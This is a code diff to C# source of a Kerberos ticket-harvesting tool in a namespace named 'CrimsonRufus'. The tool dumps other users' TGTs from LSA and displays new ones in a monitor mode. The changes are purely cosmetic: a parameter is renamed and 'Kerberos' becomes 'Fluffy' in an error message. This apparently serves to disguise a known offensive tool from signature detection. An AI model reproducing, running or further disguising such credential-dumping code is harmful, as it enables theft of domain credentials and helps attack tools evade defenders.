@@ -35,7 +35,7 @@ namespace CrimsonRufus
         {
             if (!Helpers.IsHighIntegrity())
             {
-                Console.WriteLine("\r\n[X] You need to have an elevated context to dump other users' Kerberos tickets :( \r\n");
+                Console.WriteLine("\r\n[X] You need to have an elevated context to dump other users' Fluffy tickets :( \r\n");
                 return;
             }
 
@@ -107,10 +107,10 @@ namespace CrimsonRufus
             }
         }
 
-        private void AddTicketsToTicketCache(List<KRB_CRED> tickets, bool displayNewTickets)
+        private void AddTicketsToTicketCache(List<KRB_CRED> tickets, bool showNewTickets)
         {
             // adds a list of KRB_CREDs to the internal cache
-            //  displayNewTickets - display new TGTs as they're added, e.g. "monitor" mode
+            //  showNewTickets - display new TGTs as they're added, e.g. "monitor" mode
 
             bool newTicketsAdded = false;
 
@@ -147,14 +147,14 @@ namespace CrimsonRufus
                 harvesterTicketCache.Add(ticket);
                 newTicketsAdded = true;
 
-                if (displayNewTickets)
+                if (showNewTickets)
                 {
                     Console.WriteLine($"\r\n[] {DateTime.Now.ToUniversalTime()} UTC - Found new TGT:\r\n");
                     LSA.DisplayTicket(ticket, 2, true, true, false, this.nowrap);
                 }
             }
 
-            if(displayNewTickets && newTicketsAdded)
+            if(showNewTickets && newTicketsAdded)
                 Console.WriteLine("[*] Ticket cache size: {0}\r\n", harvesterTicketCache.Count);
         }
 
